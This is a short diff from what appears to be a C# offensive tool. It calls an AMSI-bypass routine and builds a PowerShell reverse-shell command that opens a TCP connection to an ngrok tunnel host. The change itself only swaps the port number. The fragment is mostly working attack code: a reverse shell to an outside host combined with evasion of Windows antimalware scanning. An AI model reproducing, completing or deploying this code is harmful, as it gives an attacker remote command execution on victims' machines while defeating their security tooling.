@@ -165,7 +165,7 @@
                         Console.WriteLine(BypassAMSI());
 						
 						//Change IP and PORT
-						string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',17581);
+						string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',13577);
                                     $stream = $client.GetStream();
                                     [byte[]]$bytes = 0..65535|%{0};
                                     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
